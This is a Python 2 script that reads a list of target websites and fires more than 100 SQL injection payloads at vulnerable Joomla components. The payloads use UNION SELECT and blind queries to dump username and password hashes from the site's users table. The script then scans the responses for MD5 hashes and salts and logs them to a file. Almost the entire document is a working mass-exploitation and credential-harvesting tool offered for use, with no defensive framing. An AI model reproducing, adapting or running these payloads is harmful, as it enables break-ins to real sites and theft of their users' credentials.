#List of sites accepted 
#Salt Part has been added.
 
import sys,os, re, urllib2, socket ,string
 
if sys.platform == 'linux-i386' or sys.platform == 'linux2' or sys.platform == 'darwin':
	SysCls = ''
elif sys.platform == 'win32' or sys.platform == 'dos' or sys.platform[0:5] == 'ms-dos':
	SysCls = 'cls'
else:
	SysCls = 'unknown'
 
os.system(SysCls)
 
print "\n\n"
 
if len(sys.argv) < 2: 
	print "\n\n" 
	sys.exit(1)
 
list= sys.argv[1]
try:
 
	hosts= open(list,'r')
except (IOError):
	print " \n\nSite List Missing ..Exiting :("
	sys.exit(0)
 
pre=raw_input("\nEnter the DB prefix or press Enter to use default\n") 
salt= raw_input("\n Do you think target has salted or unsalted version ! press y for yes or n for no \n")
if pre=='':
	pre="jos"
 
paths = ["index.php?option=com_hwdvideoshare&func=viewcategory&Itemid=61&cat_id=-9999999/**/union/**/select/**/000,111,222,username,password,0,0,0,0,0,0,0,0,0,0,0,1,1,1,1,2,2,2/**/from/**/"+pre+"_users/*",
	"index.php?option=com_ignitegallery&task=view&gallery=-1+union+select+1,2,concat(username,char(58),password)KHG,4,5,6,7,8,9,10+from+"+pre+"_users--&Itemid=18",
	"administrator/components/com_livechat/getSavedChatRooms.php?chat=0&last=1%20union%20select%201,unhex(hex(concat(username,0x3a,password))),3%20from%20"+pre+"_users",
	"index.php?option=com_clasifier&Itemid=61&cat_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/"+pre+"+_users/*",
	"index.php?option=com_simpleshop&Itemid=41&cmd=section&section=-000/**/union+select/**/000,111,222,concat(username,0x3a,password),0,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_joomladate&task=viewProfile&user=9999999 UNION SELECT user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),concat(username,0x3a,password),user(),user(),user(),user(),user(),user(),user() FROM +"+pre+"_users--",
	"index.php?option=com_pccookbook&page=viewuserrecipes&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",  
	"index.php?option=com_gameq&task=page&category_id=-1 UNION SELECT 1,2,3,concat(username,0x3a,password),5,6,7,8,9,10,11,12,13,14 FROM "+pre+"_users--",
	"index.php?option=com_simpleshop&task=browse&Itemid=29&catid=-1 UNION SELECT user(),concat(username,0x3a,password),user(),user(),user(),user(),user(),user() FROM "+pre+"_users--",
	"index.php?option=com_joomradio&page=show_video&id=-1%20UNION%20SELECT%20user(),concat(username,0x3a,password),user(),user(),user(),user(),user()%20FROM%20"+pre+"_users--",
	"index.php?option=com_altas&mes=-1%20union%20select%201,2,password,4,5,6,7,8/**/from/**/"+pre+"_users--",
	"index.php?option=com_is&task=motor&motor=-1%20union%20select%201,2,password,4,5,6,7,8,9,10,11,12,13/**/from/**/"+pre+"_users--",
	"index.php?option=com_idoblog&task=userblog&userid=42 and 1=1 UNION SELECT user(),user(),user(),user(),user(),concat(username,0x3a,password),user(),user(),user(),user(),user(),user(),user(),user(),user(),user() FROM "+pre+"_users--",
	"administrator/components/com_astatspro/refer.php?id=-1/**/union/**/select/**/0,concat(username,0x3a,password,0x3a,usertype),concat(username,0x3a,password,0x3a,usertype)/**/from/**/"+pre+"_users/*", 
	"index2.php?option=com_prayercenter&task=view_request&id=-1 UNION SELECT user(),user(),concat(username,0x3a,password),user(),user(),user(),user(),user(),user(),user(),user(),user(),user() FROM "+pre+"_users--",
	"index.php?option=com_biblestudy&view=mediaplayer&id=-1+union+select+1,2,3,4,5,6,7,8,9,10,11,13,14,15,16,17,18,19,20,concat_ws(CHAR(58),username,password),22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40+from+"+pre+"_users--",
	"index.php?option=com_easybook&Itemid=1&func=deleteentry&gbid=-1+union+select+1,2,concat(0x3A3A3A,username,0x3a,password,0x3A3A3A),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19+from+"+pre+"_users/*",
	"index.php?option=com_galeria&Itemid=61&func=detail&id=-999999/**/union/**/select/**/0,0,password,111,222,333,0,0,0,0,0,1,1,1,1,1,1,444,555,666,username/**/from/**/"+pre+"_users/*", 
	"index.php?option=com_artist&idgalery=-1+union+select+1,2,3,concat(username,0x3a,password),5,6,7,8,9+from+"+pre+"_users/*",
	"index.php?option=com_jooget&Itemid=61&task=detail&id=-1/**/union/**/select/**/0,333,0x3a,333,222,222,222,111,111,111,0,0,0,0,0,0,0,0,1,1,2,2,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*", 
	"index.php?option=com_quiz&task=user_tst_shw&Itemid=61&tid=1/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0x3a,password)/**/from/**/"+pre+"_users/*", 
	"index.php?option=com_paxxgallery&Itemid=46&task=view&gid=7'+and+1=(select+1+from+"+pre+"_users+where+length(if(ascii(upper(substring((select+password+from+"+pre+"_users+where+id=62",
	"index.php?option=com_paxxgallery&Itemid=85&gid=7&userid=2&task=view&iid=-3333%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2C1%2C2%2C3%2Cconcat(username,0x3a,password)%2F%2A%2A%2Ffrom%2F%2A%2A%2F"+pre+"_users", 
	"index.php?option=com_xfaq&task=answer&Itemid=42&catid=97&aid=-9988%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),0x3a,password,0x3a,username,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0/**/from/**/"+pre+"_users/*", 
	"index.php?option=com_pcchess&Itemid=61&page=players&user_id=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/"+pre+"_users/*", 
	"index.php?option=com_neogallery&task=show&Itemid=5&catid=999999%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),concat(username,0x3a,password),concat(username,0x3a,password)/**/from%2F%2A%2A%2F"+pre+"_users", 
	"index.php?option=com_jpad&task=edit&Itemid=39&cid=-1 UNION ALL SELECT 1,2,3,concat_ws(0x3a,username,password),5,6,7,8 from "+pre+"_users--",
	"index.php?option=com_noticias&Itemid=xcorpitx&task=detalhe&id=-99887766/**/union/**/%20select/**/0,concat(username,0x3a,password,0x3a,email),2,3,4,5/**/%20from/**/%20"+pre+"_users/*", 
	"index.php?option=com_doc&task=view&sid=-1/**/union/**/select/**/concat(username,0x3a,password),1,2,concat(username,0x3a,password),0x3a,5,6,7,8,password,username,11/**/from/**/"+pre+"_users/", 
	"index.php?option=com_marketplace&page=show_category&catid=-1+union+select+concat(username,0x3a,password),2,3+from+"+pre+"_users/*", 
	"index.php?option=com_thyme&calendar=1&category=1&d=1&m=1&y=2008&Itemid=1&event=1'+union+select+1,2,3,4,5,6,7,8,9,0,1,2,concat(username,0x3a,password),4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4+from+"+pre+"_users/*",
	"index.php?option=com_directory&page=viewcat&catid=-1/**/union/**/select/**/0,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*", 
	"index.php?option=com_neoreferences&Itemid=27&catid=99887766/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/"+pre+"_users/*%20where%20user_id=1=1/*", 
	"index.php?option=com_puarcade&Itemid=92&fid=-1%20union%20select%20concat(username,0x3a,password)%20from%20"+pre+"_users--",
	"index.php?option=com_ynews&Itemid=0&task=showYNews&id=-1/**/union/**/select/**/0,1,2,username,password,5,6%20from%20"+pre+"_users/*", 
	"index.php?option=com_comprofiler&task=userProfile&user=1/**/and/**/mid((select/**/password/**/from/**/"+pre+"_users/**/limit/**/0,1),1,1)/**/</**/Char(97)/*",
	"index.php?option=com_xfaq&task=answer&Itemid=27&catid=97&aid=-9988%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),0x3a,password,0x3a,username,0,0,0,0,1,1,1,1,1,1,1,1,0,0,0/**/from/**/"+pre+"_users/*",
	"index.php?option=com_rsgallery&page=inline&catid=-1%20union%20select%201,2,3,4,concat(username,0x3a,password),6,7,8,9,10,11%20from%20mos__users--",
	"index.php?option=com_mcquiz&task=user_tst_shw&Itemid=42&tid=1%2F%2A%2A%2Funion%2F%2A%2A%2Fselect/**/concat(username,0x3a,password),concat(username,0x3a,password),0x3a/**/from/**/"+pre+"_users/*",
	"index.php?option=com_paxxgallery&Itemid=85&gid=7&userid=S@BUN&task=view&iid=-3333%2F%2A%2A%2Funion%2F%2A%2A%2Fselect%2F%2A%2A%2F0%2C1%2C2%2C3%2Cconcat(username,0x3a,password)%2F%2A%2A%2Ffrom%2F%2A%2A%2F"+pre+"_users",
	"index.php?option=com_eventlist&func=details&did=9999999999999%20union%20select%200,0,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),4,5,6,7,8,9,00,0,444,555,0,777,0,999,0,0,0,0,0,0,0%20from%20"+pre+"_users/*", 
	"index.php?option=com_nicetalk&tagid=-2)%20union%20select%201,2,3,4,5,6,7,8,0,999,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),777,666,555,444,333,222,111%20from%20"+pre+"_users/*", 
	"index.php?option=com_neorecruit&task=offer_view&id=option=com_neorecruit&task=offer_view&id=99999999999%20union%20select%201,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),3,4,5,6,7,8,111,222,333,444,0,0,0,555,666,777,888,1,2,3,4,5,0%20from%20"+pre+"_users/*", 
	"index.php?option=com_gmaps&task=viewmap&Itemid=57&mapId=-1/**/union/**/select/**/0,username,password,3,4,5,6,7,8/**/from/**/"+pre+"_users/*",
	"index.php?option=com_garyscookbook&Itemid=21&func=detail&id=-666/**/union+select/**/0,0,password,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,username+from%2F%2A%2A%2F"+pre+"_users/*",
	"index.php?option=com_ponygallery&Itemid=x&func=viewcategory&catid=%20union%20select%201,2,3,concat(char(117,115,101,114,110,97,109,101,58),username,char(32,112,97,115,115,119,111,114,100,58),password),5,0,0%20from%20"+pre+"_users/*", 
	"index.php?option=com_equotes&id=13 and 1=1 union select user(),concat(username,0x3a,password),user(),user(),user(),user(),user() FROM "+pre+"_users--",
	"index.php?option=com_rwcards&task=listCards&category_id=-1'union%20select%201,2,03,4,concat(char(117,115,101,114,110,97,109,101,58),username,char(112,97,115,115,119,111,114,100,58),password),50,044,076,0678,07%20from%20"+pre+"_users/*",
	"index.php?option=com_hello_world&Itemid=27&task=show&type=intro&id=-9999999/**/union/**/select/**/0x3a,username,password,0x3a/**/from/**/"+pre+"_users/*",
	"index.php?option=com_product&Itemid=12&task=viewlist&catid=-9999999/**/union/**/select/**/username,1,2,3,password,5,6,7,8,9/**/from/**/"+pre+"_users/*",
	"index.php?option=com_cms&act=viewitems&cat_id=-9999999/**/union/**/select/**/111,111,concat(username,0x3a,password),222,222,333,333/**/from/**/"+pre+"_users/*",
	"index.php?option=com_most&mode=email&secid=-9999999/**/union/**/select/**/0000,concat(username,0x3a,password),2222,3333/**/from/**/"+pre+"_users/*",
	"index.php?option=com_idvnews&id=-1/**/union/**/select/**/0,concat(username,0x3a,password),2222,concat(username,0x3a,password),0,0,0,0/**/from/**/"+pre+"_users/*",
	"index.php?option=com_actualite&task=edit&id=-1%20union%20select%201,concat(username,char(32),password),3,4,5,6,7,8,9%20from%20"+pre+"_users/*",
	"index.php?option=com_joomlavvz&Itemid=34&func=detail&id=-9999999+union/**/select+0x3a,0x3a,password,0,0,0,0,0,0,0,0,0x3a,0x3a,0x3a,0x3a,username/**/from/**/"+pre+"_users/*",
	"index.php?option=com_referenzen&Itemid=7&detail=-9999999+union/**/select/**/0x3a,concat(username,0x3a,password),0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,concat(username,0x3a,password),0,0,0,0,0/**/from/**/"+pre+"_users/*",
	"index.php?option=com_genealogy&task=profile&id=-9999999/**/union/**/select/**/0,0x3a,2,0x3a,0x3a,5,0x3a,0x3a,8,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_listoffreeads&AdId=-1/**/union/**/select/**/0,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_facileforms&Itemid=640&user_id=107&catid=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_geoboerse&page=view&catid=-1/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_ricette&Itemid=S@BUN&func=detail&id=-9999999/**/union/**/select/**/0,0,%20%20%200x3a,111,222,333,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_team&gid=-1/**/union/**/select/**/1,2,3,password,5,6,7,8,9,10,username,12,13/**/from/**/"+pre+"_users/*",
	"index.php?option=com_formtool&task=view&formid=2&catid=-9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_jooget&Itemid=S@BUN&task=detail&id=-1/**/union/**/select/**/0,333,0x3a,333,222,222,222,111,111,111,0,0,0,0,0,0,0,0,1,1,2,2,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_profile&Itemid=42&task=&task=viewoffer&oid=9999999/**/union/**/select/**/concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_sg&Itemid=16&task=order&range=3&category=3&pid=-9999999/**/union/**/select/**/0,1,concat(username,0x3a,password),0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,10,11,0x3a,0x3a,14,15,16/**/from/**/"+pre+"_users/*",
	"index.php?option=faq&task=viewallfaq&catid=-9999999/**/union/**/select/**/concat(username,0x3a,password),0x3a,0/**/from/**/"+pre+"_users/*",
	"index.php?option=com_omnirealestate&Itemid=0&func=showObject&info=contact&objid=-9999/**/union/**/select/**/username,password/**/from/**/"+pre+"_users/*&results=joomla",
	"index.php?option=com_model&Itemid=0&task=pipa&act=2&objid=-9999/**/union/**/select/**/username,password/**/from/**/"+pre+"_users/*",
	"index.php?option=com_mezun&task=edit&hidemainmenu=joomla&id=-9999999/**/union/**/select/**/concat(username,0x3a,password),username,password,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a,0x3a/**/from/**/"+pre+"_users/*",
	"index.php?option=com_ewriting&Itemid=9999&func=selectcat&cat=-1+UNION+ALL+SELECT+1,2,concat(username,0x3a,password),4,5,6,7,8,9,10+FROM+"+pre+"_users--",
	"index.php?option=com_candle&task=content&cID=-9999/**/union/**/select/**/0x3a,username,0x3a,password,0x3a,0x3a/**/from/**/"+pre+"_users/*",
	"index.php?option=com_acajoom&act=mailing&task=view&listid=1&Itemid=1&mailingid=1/**/union/**/select/**/1,1,1,1,concat(username,0x3a,password),1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1/**/from/**/"+pre+"_users/**/LIMIT/**/1,1/*",
	"index.php?option=com_joovideo&Itemid=S@BUN&task=detail&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,2,2,2,2,2,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_alberghi&task=detail&Itemid=S@BUN&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,0,11,12,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_alberghi&task=detail&Itemid=S@BUN&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,0,11,12,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_restaurante&task=detail&Itemid=S@BUN&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,0,11,12,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,4,4,4,4,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_productshowcase&Itemid=S@BUN&action=details&id=-99999/**/union/**/select/**/0,concat(username,0x3a,password),concat(username,0x3a,password),0,0,0,0,0,1,1,1,1,2,3,4,5/**/from/**/"+pre+"_users/*",
	"index.php?option=com_rekry&Itemid=60&rekryview=view&op_id=-1/**/union/**/select/**/1,concat(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17%20from%20"+pre+"_users+limit+1,1--",
	"index.php?option=com_d3000&task=showarticles&id=-99999/**/union/**/select/**/0,username,password/**/from/**/"+pre+"_users/*",
	"index.php?option=com_cinema&Itemid=S@BUN&func=detail&id=-99999/**/union/**/select/**/0,1,0x3a,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_alberghi&task=detail&Itemid=S@BUN&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,0,11,12,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_alberghi&task=detail&Itemid=S@BUN&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,0,11,12,1,1,1,1,1,1,1,1,2,2,2,2,2,2,2,2,2,2,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,3,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_joovideo&Itemid=S@BUN&task=detail&id=-99999/**/union/**/select/**/0,0,0x3a,0,0,0,0,0,0,0,1,1,1,1,1,1,1,1,1,1,2,2,2,2,2,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?option=com_myalbum&album=-1+union+select+0,concat(username,char(32),password),2,3,4%20from%20"+pre+"_users/*",
	"index.php?option=com_phocadocumentation&view=section&id=1+AND+1=2+UNION+SELECT+concat(username,0x3a,password),2,3+from+"+pre+"_users",
	"index.php?option=com_filiale&idFiliale=-5+union+select+1,password,3,4,username,6,7,8,9,10,11+from+"+pre+"_users",
	"index.php?option=com_na_newsdescription&task=show&groupId=17377_19&newsid=85790+AND+1=2+UNION+SELECT+concat(username,0x3a,password),2,3,4,5,6,7,8+from+"+pre+"_users",
	"index.php?option=com_flippingbook&Itemid=28&book_id=null/**/union/**/select/**/null,concat(username,0x3e,password),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null/**/from/**/"+pre+"_users/*",
	"index.php?option=com_vr&Itemid=78&task=viewer&room_id=-1%20union%20select%20concat(CHAR(60,117,115,101,114,62),CHAR(60,117,115,101,114,62)),2 from/**/"+pre+"_users--",
	"index.php?option=com_brightweblinks&Itemid=58&catid=<valid_id> UNION SELECT 1,2,concat(username,0x3a,password),4,5,6,7,8,9,10,11,12,13,14,15,16,17 FROM "+pre+"_users WHERE usertype=0x53757065722041646d696e6973747261746f72--",
	"index.php?option=com_mad4joomla&jid=-2+union+select+1,concat(username,char(58),password)KHG,3,4+from+"+pre+"_users--",
	"index.php?option=com_alphacontent&section=6&cat=15&task=view&id=-999999/**/union/**/select/**/1,concat(username,0x3e,password),3,4,user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),user(),39/**/from/**/"+pre+"_users/*",
	"index.php?option=com_mygallery&func=viewcategory&cid=-1%20union%20select%201,2,user(),4,5,6,7,8,9,10,11,12--",
	"index.php?option=com_versioning&task=edit&id=-83 UNION SELECT 1,concat(username,0x3a,password),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29 FROM "+pre+"_users--",
	"index.php?option=com_beamospetition&pet=-5 UNION SELECT user(),user(),user(),user(),user(),user(),user(),concat(username,0x3a,password),user(),user(),user(),user(),user(),user(),user() FROM "+pre+"_users--",
	"index.php?option=com_jabode&task=sign&sign=taurus&id=-2 UNION SELECT user(),user(),user(),user(),concat(username,0x3a,password) FROM "+pre+"_users--",
	"index.php?option=com_expshop&page=show_payment&catid=-2 UNION SELECT @@version,@@version,concat(username,0x3a,password) FROM "+pre+"_users--",
	"index.php?option=com_kbase&view=article&id=-1+union+select+1,concat(username,char(58),password)KHG,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18+from+"+pre+"_users--",
	"index.php?option=com_cinema&Itemid=S@BUN&func=detail&id=-99999/**/union/**/select/**/0,1,0x3a,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,29,29,30,concat(username,0x3a,password)/**/from/**/"+pre+"_users/*",
	"index.php?Itemid=53&option=com_hotspots&task=w&w=5+and+1=2+union+select+concat(username,0x3a,password)+from+"+pre+"_users--",
	"index.php?option=com_dailymessage&Itemid=31&page=[PAGENAME]&id=-7+union+select+concat(username,char(58),password)KHG,2,3+from+"+pre+"_users--",
	"index2.php?option=ds-syndicate&version=1&feed_id=1+union+all+select+1,concat(username,char(58),password,char(58),email),3,4,5,6,7,8,9,0,11,12,13,14,15,16,17,18,19,20+from+"+pre+"_users--",
	"index.php?option=com_ownbiblio&view=catalogue&catid=-1+union+all+select+1,2,concat(username,char(58),password)KHG,4,5,6,7,8,9,10,11,12,13,14,15,16+from+"+pre+"_users--",
	"index.php?option=com_contactinfo&catid=-9999/**/UNION/**/SELECT/**/1,2,concat(username,char(58),password),4,5,6,7,8,9,0,11,12,13,14,15,16+from+"+pre+"_users/*",
	"index.php?option=com_jb2&PostID=-9999'/**/UNION/**/SELECT/**/1,unhex(hex(concat(username,0x3a,password))),3,4,5,6,7+from+"+pre+"_users/*",
	"index.php?option=com_catalogproduction&task=viewdetail&id=-9999 union all select 1,2,concat(username,char(58),password),null,null,6,7,8,9,0,11,12,13,14,15,16,17,null,19,20+from+"+pre+"_users",
	"index.php?option=com_marketplace&page=show_category&catid=9999+union+select+concat(username,0x3a,password),2,3+from+"+pre+"_users--",
	"index.php?option=com_simple_review&category=4+AND+1=2+UNION+SELECT+0,concat_ws(username,0x3a,password),2+from+"+pre+"_users--",
	"index.php?option=com_mdigg&act=story_lists&task=view&category=-9999/**/union/**/all/**/select/**/1,2,3,4,concat(username,0x3a,password),6,7,8,9,0,11,12,13/**/from/**/"+pre+"_users/*",
	"index.php?option=com_5starhotels&task=showhoteldetails&id=1+union+select+1,concat(username,0x3a,password)+from/**/"+pre+"_user--",
	"index.php?option=com_mailto&tmpl=mailto&article=550513+and+1=2+union+select+concat(username,char(58),password)KHG+from+"+pre+"_users--&Itemid=1",
	"index.php?option=com_maianmusic&section=category&category=-1+union+select+1,2,3,concat(username,char(58),password)KHG,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21+from+"+pre+"_users--&Itemid=70",
	"index.php?option=com_bookjoomlas&Itemid=26&func=comment&gbid=-1 UNION ALL SELECT 1,2,NULL,4,NULL,6,7,NULL,9,CONCAT(username,0x3a,password),11,12,13,14,15,16 FROM "+pre+"_users",
	"index.php?option=com_mydyngallery&directory=zzz'+union+select+0,1,2,concat(0x3C703E,username,0x7c,password,0x3C2F703E),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31+from+"+pre+"_users/*",
	"index.php?option=com_jmovies&Itemid=29&task=detail&id=-1+union+select+1,concat(0x215F,username,0x3a,password,0x215F)+from+"+pre+"_users",
	"index.php?option=com_tech_article&Itemid=17&item=-1+union+select+0,concat(username,0x3a,password),0,0,0,0,0,0,0+from+"+pre+"_users--&task=item",
	"index.php?option=com_volunteer&task=jobs&act=jobshow&Itemid=29&orgs_id=3&job_id=-9999+union+all+select+concat(username,char(58),password),2,3,4,5,6,7,8,9,0,11,12,13,14,15,16,17,18,19,20+from+"+pre+"_users--&filter=&city_id=&function_id=&limit=5&pageno=1",
	"index.php?option=com_fantasytournament&func=teamsByRound&Itemid=79&roundID=-1+union+select+1,concat(username,char(58),password)KHG,3,4,5,6+from+"+pre+"_users--",
	"index.php?option=com_fantasytournament&Itemid=&func=managersByManager&managerID=-63+union+select+concat(username,char(58),password)KHG,2,3+from+"+pre+"_users--",
	"index.php?option=com_camelcitydb2&id=-3+union+select+1,2,concat(username,char(58),password)KHG,4,5,6,7,8,9,10,11+from+"+pre+"_users--&view=detail&Itemid=15",
	"index.php?option=com_gigcal&task=details&gigcal_gigs_id=402'+and+1=2/**/UNION/**/SELECT/**/1,2,3,4,5,6,7,8,concat(username,char(58),password),0,11,12+from+"+pre+"_users/*&Itemid=37",
	"index.php?option=com_resman&task=moreinfo&id=-1%20union%20select%20111,concat(char(117,115,101,114,110,97,109,101,58),username,char(112,97,115,115,119,111,114,100,58),password),333%20from%20"+pre+"_users/*"] 
 
 
 
for host in hosts:
 	host=host[:-1]
	socket.setdefaulttimeout(10)
	file=open ('hash.txt' , 'a')
	file.write(host +'\t : ') 
	print "[+] JoomlaPath:",host 
	print "[+] Vuln. Loaded:",len(paths) 
	if host[:7] != "http://": 
		host = "http://"+host 
	if host[-1:] != "/": 
		host = host+"/" 
	print "[+] Testing..." 
	for path in paths: 
		try: 
			#print host+path 
			source = urllib2.urlopen(host+path, "80").readlines() 
			for line in source:
				if salt=='y':
					if (re.search("<p>",line) or re.search ('</p>',line)): # cleaning up the result
						line=line.replace("<p>","").replace('</p>',"")
					md5s=re.findall(":"+"[a-f0-9]"*32+":",line)
					if (len(md5s)>=1):			
						demo=line.split(":")
						print "\nHost:",host+path 
						print "\n User:"+demo[0]
						print "\n Password: "+demo[1]
						print "\n Salt:"+demo[2] 
 
				else:
					md5s = re.findall(":"+"[a-f0-9]"*32,line) 
					demo=line.split(":")
					#print "\nHost:",host+path 
					#print "\n User:"+demo[0]
					if len(md5s) >=1: 
						print "Found:" 
						for md5 in md5s: 
							print "\t-",md5
							file.write( md5 +'\n'+host+path)
 
		except(urllib2.URLError, socket.timeout, socket.gaierror, socket.error): 
				pass 
		except(KeyboardInterrupt): 
				pass 
 
	print "\n[-] Done\n"
